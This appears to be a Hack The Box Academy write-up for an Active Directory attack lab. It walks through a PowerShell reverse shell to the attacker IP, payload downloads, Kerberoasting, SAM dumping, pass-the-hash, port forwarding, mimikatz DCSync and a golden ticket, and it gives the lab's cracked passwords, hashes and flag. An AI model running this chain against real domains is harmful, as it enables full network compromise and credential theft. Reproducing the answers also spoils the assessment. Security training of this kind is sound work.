# AD Enumeration & Attacks - Skills Assessment Part I  

>Scenario [AD Enumeration & Attacks - Skills Assessment Part I](https://academy.hackthebox.com/module/143/section/1278)  

> webshell access at `http://10.129.120.199/uploads/antak.aspx` with these credentials: `admin:My_W3bsH3ll_P@ssw0rd!`.  

## Start Listener Metasploit  

```
sudo msfconsole

msf6 exploit(multi/handler) > set payload payload/windows/shell/reverse_tcp
```  

>Execute Powershell Payload in the webshell:

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.163',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```  

>Obtain flag from `C:\users\administrator\desktop>` running command `get-content flag.txt`. 

## Kerberoast - SPN  

>Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer.  
>Host Active directory tools from path on Kali Linux.  

```
cd htb/academy/ActiveDirectory/Tools
sudo python3 -m http.server 80
```  

>Upload to Windows member server victim tools such as `PowerView`.  

```
(new-object net.webclient).downloadfile('http://10.10.15.163/PowerView.ps1', 'C:\tools\PowerView.ps1')
```

>Import PowerView on target in powershell console. and get domain users with spn values.  

```
import-module ./powerview.ps1

Get-DomainUser * -spn | select samaccountname

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```  

>Take the output hash values and crack with hashcat.  

```
c:\Tools\hashcat625>
hashcat.exe -m 13100 s:\hashes\ad-assess1.hash s:\wordlists\rockyou.txt -O
```

## Credentials to Domain  

>Password for user `svc_sql` is obtained from running hashcat.  

```
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$8754c1 <snip> 80faa9acb915:lucky7
```

>Credentials obtained, `svc_sql:lucky7`  

## SAM Attack  

>In the current reverse shell as system save the SAM, System and Security registry hives to file. Transfer the files with the webshell to kali linux.  

```
reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save
```  

>On Kali linux extract the hashes from SAM files.  

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```  

>output from Impacket secretsdump:  

```
[*] Target system bootKey: 0x908b8788f43a4425cb000861860970e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-29 21:32:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:51e2d013974236b559923abf67e2d9484ddc1659df2896c38bd5c75796f6f020b918f14c3668c6e6f849ba2cc8981193952b0b20d89558f2b6eaced126e82e1c670951d4b1d3d1df61ac0ac2151f4baa02a93a0e18e10ad51fbd43727839c7753566b15bf7fac5ef159e9903b3a7d69d19f79adeee555a63af1f47b3875a1f488438acdde74568669b721c7cbde4edbd336a9f1ca2c1faa2b9b0b1125297139b20c6c1e0aca01b7a17df4c74f31c90a154a5e895e1ea352e8c03b9221677ec302d3d0a2bc02f4dc9e92ed8d4742a621630020e72a5e452927110deaabdc0b2533bb2e41f19c134141b0945953e1de20a
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b0f52a34065997628d1dd9cd8202ce32
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2b2dc77fd80b47be8ec5a3828de72d30b7314b2e
dpapi_userkey:0xb48b1806f8e0c5022b9cc0f92da0781ce6a24a60
[*] L$ASP.NETAutoGenKeysV44.0.30319.0 
```  

> The PASSWORD SAM ATTACK provided the NTLM hash for domain administrator but not password.

## Pass the Hash  

>Create evil-winrm session with the hash of administrator.

```
evil-winrm -i 10.129.123.193 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
```


>optional testing upload meterpreter shell payload exe.  

```
sudo msfconsole

msf6 exploit(multi/handler) > set payload payload/windows/shell/reverse_tcp
```

>Msfvenom created the exe payload and upload with powershell on target. Execute to get meterpreter shell.  

```
(new-object net.webclient).downloadfile('http://10.10.15.163/exploit1337.exe', 'C:\tools\exploit1337.exe')

./exploit1337.exe
```

>Submit the contents of the flag.txt file on the Administrator desktop on MS01 objective.  

```
ping MS01

MS01.INLANEFREIGHT.LOCAL [172.16.6.50]
```  

>The Establishing of WinRM Session from Windows and powershell runas ,failed.  

```
$password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\svc_sql", $password)
Enter-PSSession -ComputerName MS01 -Credential $cred
```

## Port Forwarding Tunnel  

>Tunnel, port forward from target to kali, and redirect to the target MS01.

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.123.193 connectport=3389 connectaddress=172.16.6.50
```

>On kali make remote desktop connection to the port `8080` that is forwarded with `netsh.exe` to port `3389` of remote second target.  

```
xfreerdp /v:10.129.123.193:8080 /u:svc_sql /p:lucky7 /d:INLANEFREIGHT.LOCAL /dynamic-resolution /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
```

>mapping the drive to kali through the RDP session allow to transfer any sensitive files stolen or tools to be uploaded to second target MS01.  

## SAM Attack - again on MS01  

>dump registry as user svc_sql on MS01 to obtain `tpetty` user hash or password.  

```
reg.exe save hklm\sam C:\tools\sam.save
reg.exe save hklm\system C:\tools\system.save
reg.exe save hklm\security C:\tools\security.save
```

>On kali extract hash secrets by dumping it.  

```
cd sam2

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

impacket-secretsdump -sam sam.save -system system.save -security security.save local
```

## Lateral movement  

>Credentials obtained for domain user `INLANEFREIGHT.LOCAL/tpetty` with password of `Sup3rS3cur3D0m@inU2eR` in clear text from SAM attack.  

>copy mimikatz to target MS01.  

>Run as command prompt as the user `tpetty` after discovering the user can perform `DCSYNC` attack.  


## DCSync Attack  

>Use mimikatz to perform dcsync attack.  

```
mimikatz.exe

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```  

>Output from dcsync for domain administrator account.  

```
Object RDN           : Administrator
** SAM ACCOUNT **
SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/11/2022 9:24:49 PM
Object Security ID   : S-1-5-21-2270287766-1317258649-2146029398-500
Object Relative ID   : 500
Credentials:
  Hash NTLM: 27dedb1dab4d8545c6e1c66fba077da0
    ntlm- 0: 27dedb1dab4d8545c6e1c66fba077da0
    ntlm- 1: bdaffbfe64f1fc646a3353be1c2c3c99
    lm  - 0: 757743529af55e110994f3c7e3710fc9
mimikatz #
```

>Allow pass the hash remote desktop - optional.  

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```  
 
>Identify the Domain controller IP address.  

```
ping dc01

Pinging DC01.INLANEFREIGHT.LOCAL [172.16.6.3]

xfreerdp /v:10.129.123.193:8080 /u:svc_sql /p:lucky7 /d:INLANEFREIGHT.LOCAL /dynamic-resolution /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
```

## Golden Ticket  

>In command prompt console running as `tpetty` obtain the `krbtgt` user account NTLM hash.

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```

>In a powershell console as `svc_sql` account obtain the Domain SID value to be used in Golden Ticket creation.  

```
cd c:\tools
import-module .\PowerView.ps1
Get-DomainSID

S-1-5-21-2270287766-1317258649-2146029398
PS C:\tools>
```

>Use mimikatz to create `hacker` user account in current command prompt console session.  

```
kerberos::golden /User:hacker /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /krbtgt:6dbd63f4a0e7c8b221d61f265c4a08a7 /id:500 /ptt
exit 
```  

>in current session access Domain Administrator Flag!.  

```
type \\dc01\c$\Users\Administrator\Desktop\flag.txt
r3plicat1on_m@st3r!
```  